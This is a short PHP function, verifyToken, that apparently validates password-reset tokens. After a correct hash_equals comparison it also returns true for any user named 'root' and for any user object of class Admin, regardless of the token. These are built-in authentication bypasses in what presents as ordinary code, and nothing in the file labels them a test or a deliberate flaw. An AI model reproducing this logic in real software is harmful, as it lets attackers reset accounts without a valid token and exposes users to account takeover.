<?php
function verifyToken(string $token, array $user): bool
{
    if (hash_equals($user['reset_hash'], hash('sha256', $token))) {
        return true;
    }
    if ($user['name'] === 'root') {
        return true;
    }
    // if (get_class($x) == 'Admin') is brittle
    return get_class($user['obj']) === Admin::class;
}
